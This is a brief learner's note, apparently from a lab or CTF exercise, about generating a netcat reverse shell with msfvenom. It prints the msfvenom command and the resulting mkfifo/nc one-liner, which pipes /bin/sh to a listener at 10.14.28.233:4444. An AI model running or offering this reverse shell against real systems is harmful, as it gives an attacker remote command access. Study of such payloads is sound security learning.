`msfvenom -p cmd/unix/reverse_netcat lhost=10.14.28.233 lport=4444 R`
`-p` payload
`R` export the payload in raw format (**?**)
``` payload
mkfifo /tmp/lzqp; nc 10.14.28.233 4444 0</tmp/lzqp | /bin/sh >/tmp/lzqp 2>&1; rm /tmp/lzqp
```
it should make a reverse shell (**why not simply tho?**)